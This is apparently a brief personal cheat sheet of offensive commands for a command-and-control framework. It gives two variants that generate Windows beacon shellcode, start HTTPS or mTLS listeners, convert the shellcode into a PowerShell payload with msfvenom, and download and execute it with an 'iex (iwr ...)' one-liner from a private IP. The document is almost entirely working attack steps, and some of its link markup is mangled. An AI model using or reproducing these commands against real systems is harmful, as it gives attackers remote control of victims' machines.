generate beacon --os windows --arch amd64 -b https://192.168.159.129:443 -f shellcode -s /tmp/uwu.bin --skip-symbols
https -l 443
msfvenom -p generic/custom payloadfile=uwu.bin -a x64 -f psh -o uwu.ps1
iex (iwr -usebasicparsing [http://192.168.119.156/uwu.ps1](http://192.168.119.156/rev2.ps1)[)](http://192.168.119.156/rev2.ps1))

=========
generate beacon --os windows --arch amd64 -m [192.168.1.42:53](http://192.168.1.42:53) -f shellcode -s /tmp/uwu.bin --skip-symbols
mtls -l 53
msfvenom -p generic/custom payloadfile=uwu.bin -a x64 -f psh -o uwu.ps1
iex (iwr -usebasicparsing <http://192.168.119.156/uwu.ps1>[)](http://192.168.119.156/rev2.ps1))
